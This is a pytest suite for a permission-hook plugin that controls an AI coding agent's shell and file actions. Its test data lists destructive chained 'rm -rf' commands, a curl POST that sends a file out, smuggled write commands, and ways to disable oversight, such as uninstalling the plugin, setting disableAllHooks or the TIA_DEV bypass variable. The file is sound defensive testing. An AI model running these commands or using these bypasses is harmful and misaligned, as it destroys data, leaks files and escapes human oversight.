import json
import shutil
import subprocess
from pathlib import Path

import pytest

import hooks
import ledger
from conftest import BIN

LAUNCH = f'bash "{BIN / "tia.sh"}"'


def decision(out):
    return ((out or {}).get("hookSpecificOutput") or {}).get("permissionDecision")


def write(proj, rel, tool="Write"):
    return hooks.run("pretool", {"tool_name": tool, "session_id": "sessao-1",
                                 "tool_input": {"file_path": str(proj / rel)}})


def start(proj, sid="sessao-1"):
    led = ledger.Ledger(proj)
    led.sync()
    led.g1("D-001", True, None)
    led.iniciar("D-001", sid)


def test_escrita_fora_do_escopo(proj):
    assert decision(write(proj, ".tia/config.yaml")) == "deny"
    assert decision(write(proj, ".tia/ledger.json")) == "deny"
    assert decision(write(proj, "src/app.py")) == "deny"
    assert decision(hooks.run("pretool", {"tool_name": "Write", "tool_input": {"file_path": "C:/fora/x.md"}})) == "deny"


def test_arquivos_do_humano(proj):
    assert decision(write(proj, "tia/demandas.yaml")) == "deny"
    assert decision(write(proj, "CLAUDE.md")) == "deny"


def test_kb_pede_confirmacao(proj):
    assert decision(write(proj, "tia/kb/internal-tools/regras/x.md", "Edit")) == "ask"
    assert decision(write(proj, "tia/kb/internal-tools/regras/x.py")) == "deny"


def test_pasta_da_demanda(proj):
    assert decision(write(proj, "tia/demandas/D-001/epico.md")) == "deny"  # sem demanda ativa
    start(proj)
    assert write(proj, "tia/demandas/D-001/epico.md") == {} or decision(write(proj, "tia/demandas/D-001/epico.md")) is None
    assert decision(write(proj, "tia/demandas/D-002/epico.md")) == "deny"
    assert decision(write(proj, "tia/demandas/D-001/cobertura.md")) == "deny"


def test_atlassian_escrita(proj):
    data = {"tool_name": "mcp__abc__createJiraIssue", "tool_input": {}}
    assert decision(hooks.run("pretool", data)) == "deny"
    assert hooks.run("pretool", {"tool_name": "mcp__abc__getJiraIssue", "tool_input": {}}) is None
    start(proj)
    led = ledger.Ledger(proj)
    led.data["demandas"]["D-001"]["state"] = "accepted"
    led.save()
    ledger.Ledger(proj).g3("D-001", "pode")
    assert decision(hooks.run("pretool", data)) == "ask"


def sh(cmd, tool="Bash"):
    return decision(hooks.run("pretool", {"tool_name": tool, "tool_input": {"command": cmd}}))


@pytest.mark.parametrize("cmd", [
    LAUNCH + ' kb buscar "limite"',
    "git status",
    LAUNCH + " ajuda; echo ----; " + LAUNCH + " ledger status",
    LAUNCH + " kb stats | head -20",
    LAUNCH + " kb validar && " + LAUNCH + " kb apontamentos --abertos",
    LAUNCH + " doctor 2>&1",
    "$env:PYTHONIOENCODING='utf-8'; & \"" + str(BIN / "tia.sh") + "\" report",
    "bash '" + str(BIN / "tia.sh").replace("\\", "/") + "' metricas ativos",
])
def test_shell_seguro_passa_sem_perguntar(proj, cmd):
    assert sh(cmd) == "allow", cmd


@pytest.mark.parametrize("cmd", [
    "npm install",
    "pip install requests",
    "git status; rm -rf kb",
    "cat x & rm -rf kb",
    "git log\nrm -rf kb",
    "Remove-Item kb/x.md",
    "git push origin main",
    "git commit -m x",
    "FOO=1 rm -rf kb",
    "curl -X POST https://exemplo.com -d @kb/x.md",
    "Invoke-RestMethod https://x -Method Post -Body $b",
])
def test_shell_perigoso_pergunta(proj, cmd):
    assert sh(cmd) == "ask", cmd


@pytest.mark.parametrize("cmd", [
    "echo x > .tia/config.yaml",
    "sed -i 's/a/b/' CLAUDE.md",
    "cp /tmp/x.md .claude/skills/nova/SKILL.md",
    "Set-Content tia/demandas.yaml 'x'",
    "python -c \"open('.tia/config.yaml','w').write('x')\"",
    "mv x .tia/monitoramento/leituras.jsonl",
    "cp x ~/.claude/plugins/cache/tia/scripts/hooks.py",
    "bash ~/fake/tia.sh kb > .tia/x.json",
])
def test_shell_nao_grava_no_harness(proj, cmd):
    assert sh(cmd) == "deny", cmd


@pytest.mark.parametrize("cmd", [
    "find . -name '*.md'",
    "jq '.nodes[] | .title' C:/tmp/artifact.json",
    "python -I -c \"import json,sys; print(json.load(open(sys.argv[1]))['x'])\" C:/scratch/a.json",
    "sed -n '1,40p' tia/kb/README.md",
    "echo $(whoami)",
    LAUNCH + " kb stats > C:/scratch/stats.txt",
    "mkdir -p src && echo x > src/app.txt",
    "cat C:/scratch/artifact/index.html | head -50",
])
def test_resto_fica_com_o_claude_code(proj, cmd):
    assert sh(cmd) in (None, "allow"), cmd


def test_shell(proj):
    assert decision(hooks.run("pretool", {"tool_name": "Bash",
                                          "tool_input": {"command": "echo {} > .tia/ledger.json"}})) == "deny"
    assert sh("cp x .tia/ledger.json") == "deny"
    assert sh("cat .tia/ledger.json") != "deny"          # ler o ledger não é mudar
    assert sh(LAUNCH + " ledger status --json") == "allow"


def test_agente_nao_desliga_fiscalizacao(proj):
    for cmd in ('claude plugin disable tia@tia-marketplace', 'claude plugin disable tia', 'claude plugin uninstall tia',
                'claude plugins remove tia', 'claude config set disableAllHooks true',
                '$env:TIA_DEV="1"', 'export TIA_DEV=1', 'TIA_DEV=1 claude', 'set TIA_DEV=1', 'setx TIA_DEV 1',
                "[Environment]::SetEnvironmentVariable('TIA_DEV','1','User')",
                'reg add HKCU\\Environment /v TIA_DEV /d 1',
                'echo {"disableAllHooks": true} > ~/.claude/settings.json',
                "sed -i 's/hook/x/' ~/.claude/plugins/marketplaces/m/plugins/tia/hooks/hooks.json",
                'echo exit 0 > scripts/hook.sh'):
        for tool in ("Bash", "PowerShell"):
            assert sh(cmd, tool) == "deny", (tool, cmd)


# Regressão 0.1.1: casos reais que eram negados sem motivo.
@pytest.mark.parametrize("cmd", [
    'grep -n "hooks" hook.sh hooks.py',
    "git check-ignore .tia/ledger.json",
    "cat .claude/settings.json",
    "cat ~/.claude/plugins/cache/x/hooks/hooks.json",
    "git diff -- plugins/tia/scripts/hook.sh plugins/tia/hooks/hooks.json",
    "echo enabledPlugins",
    'echo "TIA_DEV=$TIA_DEV"',
    "printenv | grep -i '^tia'",
])
def test_leitura_e_citacao_passam(proj, cmd):
    assert sh(cmd) != "deny", cmd


@pytest.mark.parametrize("cmd", [
    'git commit -m "kb/ -> tia/kb/; tia/demandas.yaml"',
    'git commit -m "Move .tia/ledger.json e CLAUDE.md; hooks.json -> novo"',
    "git commit -am 'a -> b em .tia/config.yaml'",
    "git commit -F - <<'EOF'\nkb/ -> tia/kb/\n.tia/ledger.json; CLAUDE.md\nEOF",
    'git tag -m "TIA_DEV=1 -> ok" v1',
])
def test_commit_do_workspace_pergunta(proj, cmd):
    assert sh(cmd) == "ask", cmd


def test_git_add_nao_e_negado(proj):
    assert sh("git add tia/kb .tia/config.yaml CLAUDE.md") != "deny"


@pytest.mark.parametrize("cmd", [
    'echo "x" > ".tia/config.yaml"',
    "cat > .tia/config.yaml <<'EOF'\nx: 1\nEOF",
    'git commit -m "ok" && echo x > .tia/ledger.json',
    "Set-Content -Path '.tia/config.yaml' -Value 'x'",
    'bash -c "echo x > .tia/config.yaml"',
    "powershell -Command \"'x' | Out-File .tia/config.yaml\"",
    "bash -c 'export TIA_DEV=1; claude'",
])
def test_aspas_e_mensagem_nao_escondem_gravacao(proj, cmd):
    assert sh(cmd) == "deny", cmd


def test_stop_exige_entrega_da_propria_sessao(proj):
    start(proj, "sessao-1")
    out = hooks.run("stop", {"session_id": "sessao-1"})
    assert out and out["decision"] == "block" and "result.json" in out["reason"]
    assert hooks.run("stop", {"session_id": "outra"}) is None
    for _ in range(3):
        hooks.run("stop", {"session_id": "sessao-1"})
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None  # depois de 3 bloqueios, libera


def test_stop_passa_com_entrega_ok(proj, entrega):
    start(proj, "sessao-1")
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None


def test_stop_confere_kb_alterada(proj):
    hooks.run("posttool", {"session_id": "s-9", "tool_name": "Write",
                           "tool_input": {"file_path": str(proj / "tia/kb/internal-tools/regras/reprocessamento-ajustes.md")}})
    f = proj / "tia/kb/internal-tools/regras/reprocessamento-ajustes.md"
    f.write_text(f.read_text(encoding="utf-8").replace("- **Fontes:** SRC-IT-001\n", "- **Fontes:** SRC-IT-404\n", 1),
                 encoding="utf-8")
    out = hooks.run("stop", {"session_id": "s-9"})
    assert out and "Base de Conhecimento inválida" in out["reason"]


def test_session_start_injeta_id(proj):
    start(proj, "sessao-1")
    ctx = hooks.run("session_start", {"session_id": "sessao-1"})["hookSpecificOutput"]["additionalContext"]
    assert "sessao-1" in ctx and "D-001" in ctx and "NESTA sessão" in ctx


def test_fail_closed(proj, monkeypatch):
    monkeypatch.setattr(hooks, "pretool", lambda data: 1 / 0)
    monkeypatch.setitem(hooks.HANDLERS, "pretool", hooks.pretool)
    assert decision(hooks.run("pretool", {"tool_name": "Read"})) == "deny"
    monkeypatch.setenv("TIA_DEV", "1")
    assert hooks.run("pretool", {"tool_name": "Read"}) is None


def test_fora_do_workspace_python_silencia(tmp_path, monkeypatch):
    monkeypatch.setenv("TIA_ROOT", str(tmp_path))       # sem .tia/config.yaml
    assert hooks.run("pretool", {"tool_name": "Write", "tool_input": {"file_path": str(tmp_path / "x.py")}}) is None
    assert hooks.run("session_start", {"session_id": "s"}) is None


def test_metricas_da_transcricao(proj):
    tr = Path(__file__).parent / "fixtures" / "contract" / "transcript_sample.jsonl"
    hooks.run("posttool", {"session_id": "s-7", "transcript_path": str(tr), "tool_name": "Read", "tool_input": {}})
    m = json.loads((proj / ".tia" / "cache" / "metrics" / "s-7.json").read_text(encoding="utf-8"))
    assert m["messages_with_usage"] > 0 and m["output_tokens"] > 0


HAS_BASH = shutil.which("bash") is not None


def bash_hook(event, payload, env_extra, *args):
    import os
    env = {k: v for k, v in os.environ.items() if k not in ("TIA_ROOT", "CLAUDE_PROJECT_DIR",
                                                              "CLAUDE_PLUGIN_DATA", "TIA_DEV")}
    env.update(env_extra)
    return subprocess.run(["bash", str(BIN / "hook.sh"), event, *args], input=json.dumps(payload),
                          capture_output=True, text=True, encoding="utf-8", env=env)


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_fora_do_workspace_silencioso(tmp_path):
    """Sem marcador: nada sai, mesmo sem venv e mesmo para escrita perigosa."""
    env = {"CLAUDE_PROJECT_DIR": str(tmp_path), "CLAUDE_PLUGIN_DATA": str(tmp_path / "data")}
    for ev, payload in (("pretool", {"tool_name": "Write", "tool_input": {"file_path": "x.py"}}),
                        ("session_start", {"session_id": "s"}), ("stop", {}), ("posttool", {}),
                        ("prompt", {"prompt": "garantia, notícia no lugar"}), ("prompt", {"prompt": "Ada, bom dia"})):
        out = bash_hook(ev, payload, env)
        assert out.returncode == 0 and out.stdout == "", (ev, out.stdout)
    assert not (tmp_path / "data").exists()           # não criou venv fora de workspace


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_fora_do_workspace_convida_a_configurar(tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(tmp_path)}
    out = bash_hook("prompt", {"prompt": "Tia, bom dia"}, env)
    assert "ainda não é um workspace" in json.loads(out.stdout)["hookSpecificOutput"]["additionalContext"]
    out = bash_hook("prompt", {"prompt": "Tia, configurar este projeto"}, env)
    assert "tia:configurar" in json.loads(out.stdout)["hookSpecificOutput"]["additionalContext"]


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_sem_venv_nega_so_dentro(proj, tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(proj), "CLAUDE_PLUGIN_DATA": str(tmp_path / "sem-venv")}
    w = bash_hook("pretool", {"tool_name": "Write", "tool_input": {"file_path": "tia/x.md"}}, env)
    assert '"permissionDecision":"deny"' in w.stdout and "ambiente Python" in w.stdout
    assert bash_hook("pretool", {"tool_name": "Read", "tool_input": {"file_path": "x"}}, env).stdout == ""
    doc = bash_hook("pretool", {"tool_name": "Bash", "tool_input": {"command": 'bash "/p/scripts/tia.sh" doctor'}}, env)
    assert doc.stdout == ""
    assert (proj / ".tia" / "cache" / "plugin-data").read_text(encoding="utf-8").strip() == str(tmp_path / "sem-venv")


def sem_venv(proj, tmp_path, tool, ti=None):
    env = {"CLAUDE_PROJECT_DIR": str(proj), "CLAUDE_PLUGIN_DATA": str(tmp_path / "sem-venv")}
    out = bash_hook("pretool", {"tool_name": tool, "tool_input": ti or {}}, env).stdout
    if not out:
        return None
    hs = json.loads(out)["hookSpecificOutput"]                    # JSON válido mesmo com caminhos do Windows
    return hs["permissionDecision"], hs["permissionDecisionReason"]


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
@pytest.mark.parametrize("tool", ["mcp__ccd_turn__wrap_up", "mcp__ccd_turn__update_plan", "Agent", "SendMessage",
                                  "mcp__ccd_session__start_session", "mcp__x__getJiraIssue", "TaskStop"])
def test_wrapper_sem_venv_ferramentas_do_app_passam(proj, tmp_path, tool):
    assert sem_venv(proj, tmp_path, tool) is None, tool


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
@pytest.mark.parametrize("cmd", ["ls", "git status", "git check-ignore .tia/ledger.json", 'grep -n "hooks" hook.sh',
                                 "cat a.md | head -5", "Get-Content x.md"])
def test_wrapper_sem_venv_leitura_simples_passa(proj, tmp_path, cmd):
    for tool in ("Bash", "PowerShell"):
        assert sem_venv(proj, tmp_path, tool, {"command": cmd}) is None, (tool, cmd)


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
@pytest.mark.parametrize("tool,ti", [
    ("Write", {"file_path": "tia/x.md"}), ("Edit", {"file_path": "tia/x.md"}), ("NotebookEdit", {"notebook_path": "x"}),
    ("Bash", {"command": "echo x > .tia/config.yaml"}), ("Bash", {"command": "python x.py"}),
    ("Bash", {"command": "ls; rm -rf tia"}), ("Bash", {"command": "cat x & rm -rf tia"}),
    ("Bash", {"command": "echo $(rm -rf tia)"}), ("Bash", {"command": "git log\nrm -rf tia"}),
    ("Bash", {"command": "claude plugin disable tia"}), ("Bash", {"command": "export TIA_DEV=1"}),
    ("PowerShell", {"command": "Remove-Item tia -Recurse"}), ("Bash", {"command": ""}),
    ("mcp__x__createJiraIssue", {}), ("mcp__x__updateConfluencePage", {}),
])
def test_wrapper_sem_venv_continua_negando(proj, tmp_path, tool, ti):
    r = sem_venv(proj, tmp_path, tool, ti)
    assert r and r[0] == "deny", (tool, ti)
    assert "tia.sh" in r[1] and "bootstrap" in r[1]


@pytest.mark.skipif(not HAS_BASH or not shutil.which("cygpath"), reason="só no Git Bash do Windows")
def test_wrapper_mensagem_com_comando_do_powershell(proj, tmp_path):
    _, msg = sem_venv(proj, tmp_path, "Write", {"file_path": "tia/x.md"})
    assert "no Git Bash: bash \"" in msg and "no PowerShell: & \"" in msg
    assert "\\bin\\bash.exe\"" in msg and "\\scripts\\tia.sh\" bootstrap" in msg


def test_wrapper_lista_atlassian_igual_ao_inegociavel():
    import re
    import yaml
    sh_txt = (BIN / "hook.sh").read_text(encoding="utf-8")
    no_sh = re.search(r"^ATLASSIAN_ESCRITA='([^']*)'", sh_txt, re.M).group(1)
    cfg = yaml.safe_load((BIN.parent / "modelos" / "config.padrao.yaml").read_text(encoding="utf-8"))
    assert cfg["atlassian"]["ferramentas_escrita_regex"] == "(?i)" + no_sh


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_python_quebrado_nega(proj, tmp_path):
    env = {"CLAUDE_PROJECT_DIR": str(proj)}
    out = bash_hook("pretool", {"tool_name": "Read"}, env, str(tmp_path / "nao-existe.exe"))
    assert '"permissionDecision":"deny"' in out.stdout


@pytest.mark.skipif(not HAS_BASH, reason="sem bash")
def test_wrapper_com_python_chama_hooks(proj):
    import sys
    env = {"CLAUDE_PROJECT_DIR": str(proj)}
    out = bash_hook("pretool", {"tool_name": "Write", "tool_input": {"file_path": str(proj / ".tia" / "config.yaml")}},
                    env, sys.executable)
    assert '"permissionDecision": "deny"' in out.stdout


def test_hooks_json_do_plugin():
    h = json.loads((BIN.parent / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]
    assert set(h) == {"SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "Stop"}
    for regs in h.values():
        cmd = regs[0]["hooks"][0]["command"]
        assert cmd.startswith('bash "${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh" '), cmd
